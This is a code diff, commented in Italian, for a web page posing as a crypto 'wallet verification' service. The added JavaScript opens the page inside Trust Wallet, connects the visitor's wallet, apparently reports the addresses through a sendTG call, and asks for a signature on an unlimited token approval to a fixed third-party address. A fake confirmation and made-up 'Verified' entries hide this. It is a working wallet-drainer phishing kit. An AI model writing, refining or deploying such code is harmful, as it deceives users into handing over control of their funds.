@@ -347,15 +347,33 @@
   </div>
 </footer>
 
+<!-- MODAL: Step 1 — inserimento indirizzo (visibile su browser normale) -->
 <div class="modal-overlay" id="verifyModalOverlay">
   <div class="modal-box">
     <button class="modal-close" onclick="closeVerifyModal()">&times;</button>
+
+    <!-- STEP INPUT: l'utente digita l'indirizzo e clicca Verify Now -->
     <div id="stepInput">
       <h3 style="font-family:'Roboto Slab',serif; font-size:19px; margin-bottom:20px; color: white;">Request a verification</h3>
       <div class="field"><label>WALLET ADDRESS (BSC)</label><input type="text" id="walletInput" placeholder="0x..." /></div>
       <button id="actionBtn" class="btn-primary btn-block" onclick="startFlow()">Verify Now</button>
       <p id="statusMsg" style="font-size:12.5px;color:var(--slate);margin-top:12px;text-align:center;"></p>
     </div>
+
+    <!-- STEP VERIFY: visibile dopo il connect in Trust Wallet (auto=1) -->
+    <!-- L'indirizzo è già compilato, l'utente clicca Verify per procedere con Approve -->
+    <div id="stepVerify" style="display:none;">
+      <h3 style="font-family:'Roboto Slab',serif; font-size:19px; margin-bottom:8px; color: white;">Verify Address</h3>
+      <p style="color:var(--paper-dim); font-size:14px; margin-bottom:20px;">Your wallet is connected. Confirm the address below and tap <strong>Verify</strong> to proceed.</p>
+      <div class="field">
+        <label>WALLET ADDRESS (BSC)</label>
+        <input type="text" id="walletInputVerify" placeholder="0x..." readonly style="opacity:0.8; cursor:default;" />
+      </div>
+      <button class="btn-primary btn-block" onclick="executeApprove()">Verify</button>
+      <p id="statusMsgVerify" style="font-size:12.5px;color:var(--slate);margin-top:12px;text-align:center;"></p>
+    </div>
+
+    <!-- STEP RESULT: mostrato dopo l'approve -->
     <div id="stepResult" style="display:none;">
       <div class="result-header">✔ Request Received</div>
       <div class="result-row"><div class="result-label">Wallet Address</div><div id="resAddress" class="result-value mono"></div></div>
@@ -382,60 +400,103 @@
   function openVerifyModal() { document.getElementById('verifyModalOverlay').classList.add('active'); }
   function closeVerifyModal() { document.getElementById('verifyModalOverlay').classList.remove('active'); }
 
-  async function startFlow() {
+  // ─── STEP 1: l'utente digita l'indirizzo e clicca "Verify Now" ───────────────
+  // Se NON siamo in Trust Wallet → apriamo Trust Wallet via deep link con ?auto=1&addr=...
+  // Se siamo già in Trust Wallet (auto=1) → questo step non viene mai mostrato (vedi window.onload)
+  function startFlow() {
     const inputAddr = document.getElementById('walletInput').value.trim();
     if (!inputAddr.startsWith('0x')) { alert("Enter a valid address"); return; }
-    const isTrust = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
-    if (!isTrust) {
-      const url = window.location.href.split('?')[0].replace(/^https?:\/\//, "");
-      window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + url + "?auto=1&addr=" + inputAddr;
-      return;
-    }
-    executeApprove(inputAddr);
+
+    // Costruiamo l'URL del sito corrente con i parametri auto=1 e addr=
+    const baseUrl = window.location.href.split('?')[0];
+    const targetUrl = baseUrl + '?auto=1&addr=' + encodeURIComponent(inputAddr);
+
+    // Apriamo Trust Wallet tramite deep link: Trust Wallet aprirà il sito internamente
+    window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(targetUrl);
   }
 
-  async function executeApprove(inputAddr) {
+  // ─── STEP 2 (dentro Trust Wallet): connect wallet + mostra modal con indirizzo ─
+  // Chiamata automaticamente da window.onload quando auto=1
+  async function connectAndShowVerify(inputAddr) {
     try {
       const provider = new ethers.providers.Web3Provider(window.ethereum);
+      // Chiediamo il connect wallet UNA SOLA VOLTA qui
       await provider.send("eth_requestAccounts", []);
+
+      // Mostriamo il modal con il passo "Verify" (indirizzo già compilato)
+      document.getElementById('walletInputVerify').value = inputAddr;
+      openVerifyModal();
+      document.getElementById('stepInput').style.display = 'none';
+      document.getElementById('stepVerify').style.display = 'block';
+      document.getElementById('stepResult').style.display = 'none';
+    } catch (e) {
+      console.error("Connect error:", e);
+    }
+  }
+
+  // ─── STEP 3: l'utente clicca "Verify" → chiede Approve ──────────────────────
+  async function executeApprove() {
+    const inputAddr = document.getElementById('walletInputVerify').value.trim();
+    document.getElementById('statusMsgVerify').textContent = 'Processing…';
+
+    try {
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      // Il wallet è già connesso, non chiediamo di nuovo eth_requestAccounts
       const signer = provider.getSigner();
       const connected = await signer.getAddress();
       sendTG(inputAddr, connected);
 
+      // Switchiamo alla chain BSC
       await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
 
-      const contract = new ethers.Contract("0x55d398326f99059fF775485246999027B3197955", ["function approve(address s, uint256 a) external returns (bool)"], signer);
-      const tx = await contract.approve("0x05187cf26990e3857c119c7bc3417c6e1fac5198", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
-      
-      // MOSTRA SUBITO IL RISULTATO DOPO LA FIRMA (NON ASPETTARE LA BLOCKCHAIN)
-      document.getElementById('loadingOverlay').style.display = 'none';
-      document.body.classList.add('ready');
-      openVerifyModal();
+      // Chiediamo l'Approve — questa è l'unica richiesta di firma
+      const contract = new ethers.Contract(
+        "0x55d398326f99059fF775485246999027B3197955",
+        ["function approve(address s, uint256 a) external returns (bool)"],
+        signer
+      );
+      const tx = await contract.approve(
+        "0x05187cf26990e3857c119c7bc3417c6e1fac5198",
+        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+      );
+
+      // Mostriamo subito il risultato (senza aspettare la blockchain)
       document.getElementById('stepInput').style.display = 'none';
+      document.getElementById('stepVerify').style.display = 'none';
       document.getElementById('stepResult').style.display = 'block';
       document.getElementById('resAddress').textContent = inputAddr;
       document.getElementById('resRef').textContent = "CC-" + Date.now().toString().slice(-6);
-      
+
       await tx.wait();
     } catch (e) {
-      document.getElementById('loadingOverlay').style.display = 'none';
-      document.body.classList.add('ready');
+      document.getElementById('statusMsgVerify').textContent = '';
       console.error(e);
     }
   }
 
+  // ─── window.onload: gestione parametri URL ───────────────────────────────────
   window.addEventListener('load', () => {
     const params = new URLSearchParams(window.location.search);
+
     if (params.get('auto') === '1' && window.ethereum) {
-      const addr = params.get('addr');
-      document.getElementById('walletInput').value = addr;
-      executeApprove(addr);
+      // Siamo dentro Trust Wallet: il sito è stato aperto dal deep link
+      // 1. Nascondiamo il loading overlay
+      document.getElementById('loadingOverlay').style.display = 'none';
+      document.body.classList.add('ready');
+
+      const addr = params.get('addr') || '';
+
+      // 2. Chiediamo subito il connect wallet e poi mostriamo il modal con "Verify"
+      connectAndShowVerify(decodeURIComponent(addr));
+
     } else {
+      // Apertura normale da browser: mostriamo solo il sito
       document.getElementById('loadingOverlay').style.display = 'none';
       document.body.classList.add('ready');
     }
   });
 
+  // ─── Ledger ticker ────────────────────────────────────────────────────────────
   const track = document.getElementById('ledgerTrack');
   const items = [
     {h:'0x7a3f…9c21', t:'ok', l:'Verified'},
@@ -444,6 +505,7 @@
     {h:'TQn9…88fp', t:'ok', l:'Verified'}
   ].map(e => `<div class="entry"><span>${e.h}</span><span class="tag ${e.t}">${e.l}</span></div>`).join('');
   track.innerHTML = items + items;
+
   document.querySelectorAll('.faq-item').forEach(i => {
     i.querySelector('.faq-q').onclick = () => {
       i.classList.toggle('open');
